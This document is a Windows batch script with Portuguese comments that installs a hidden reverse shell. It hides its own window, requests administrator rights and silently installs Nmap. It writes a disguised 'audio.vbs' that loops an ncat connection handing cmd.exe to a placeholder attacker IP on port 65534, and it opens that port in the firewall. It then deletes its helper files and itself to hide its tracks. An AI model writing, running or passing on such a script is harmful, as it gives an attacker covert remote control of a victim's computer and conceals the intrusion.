@echo off
:: Ocultar esta janela imediatamente
if not "%1"=="hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" hidden' -WindowStyle Hidden"
    exit
)

:: Verifica se já está rodando como administrador
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Solicitando privilegios de administrador...
    powershell start -verb runas '%0'
    exit /b
)

:: Instalar Nmap
echo [*] Instalando Nmap...
winget install Insecure.Nmap --silent --accept-package-agreements --accept-source-agreements > nul 2>&1

:: Atualizar PATH com o Nmap
set "PATH=%PATH%;%ProgramFiles(x86)%\Nmap"

:: Criar audio.vbs
echo Do > "%USERPROFILE%\Downloads\audio.vbs"
echo CreateObject("Wscript.Shell").Run "ncat SEU_IP_PUBLICO 65534 -e cmd.exe", 0, True >> "%USERPROFILE%\Downloads\audio.vbs"
echo Loop >> "%USERPROFILE%\Downloads\audio.vbs"

:: Criar audio.bat
echo @echo off > "%USERPROFILE%\Downloads\audio.bat"
echo start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.vbs" >> "%USERPROFILE%\Downloads\audio.bat"
echo exit >> "%USERPROFILE%\Downloads\audio.bat"

:: Liberar a porta 65534 na saida
netsh advfirewall firewall add rule name="Abrir Porta Saida 65534" dir=out action=allow protocol=TCP localport=65534

:: Iniciar listener
start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.vbs"

:: Aguardar um momento para garantir que o listener iniciou
timeout /t 2 /nobreak >nul

:: Deletar .vbs .bat
del "%USERPROFILE%\Downloads\audio.vbs"
del "%USERPROFILE%\Downloads\audio.bat"
del "%USERPROFILE%\Downloads\Install_Shell_Reverse.bat"

exit
